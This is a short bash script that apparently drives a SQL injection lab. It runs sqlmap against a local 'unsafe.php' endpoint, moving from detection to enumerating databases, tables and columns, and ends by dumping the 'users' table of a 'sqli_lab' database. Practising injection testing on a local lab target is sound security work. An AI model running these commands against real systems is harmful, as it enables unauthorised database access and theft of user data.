#!/usr/bin/env bash
set -e
sqlmap -u "http://localhost:8080/unsafe.php?id=1" -p id --batch
sqlmap -u "http://localhost:8080/unsafe.php?id=1" -p id --dbs --batch
sqlmap -u "http://localhost:8080/unsafe.php?id=1" -p id -D sqli_lab --tables --batch
sqlmap -u "http://localhost:8080/unsafe.php?id=1" -p id -D sqli_lab -T users --columns --batch
sqlmap -u "http://localhost:8080/unsafe.php?id=1" -p id -D sqli_lab -T users --dump --batch
